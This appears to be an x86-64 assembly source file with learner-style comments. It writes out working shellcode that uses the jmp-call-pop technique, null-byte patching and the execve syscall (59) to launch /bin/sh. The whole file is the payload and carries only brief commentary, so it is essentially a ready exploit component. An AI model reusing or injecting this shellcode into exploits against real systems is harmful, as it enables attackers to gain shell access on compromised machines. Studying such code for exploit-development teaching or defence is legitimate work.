global _start
section .text

_start:
		jmp find_address

shellcode:
		xor rax, rax                     ; this is 8 byte long 0 , and zero flag
		pop rdi                           ; get the address of the string

		mov [rdi +7], byte ah             ; this will conver A -> 0x0 to null from 7th position 
											; ah denotes 1 byte because A is only one time

		mov [rdi +8], rdi                  ; this will move rdi value from in to rdi from 8th position

		mov [rdi +16], rax                 ; rax is null 0 copy the NULL 0x0000000000000000 -> CCCCCCCC from 16 position in rdi

		lea rsi, [rdi +8]                   ; rsi points to the address which is A at 8th position in rdi
		lea rdx, [rdi +16]                ; rdx points to the address which is CCC at 16th position in rdi

		add rax, 59                          ; add 59 to rax to set signal execve
		syscall

find_address:
	call shellcode

shell_path_string: db   "/bin/shABBBBBBBBCCCCCCCC"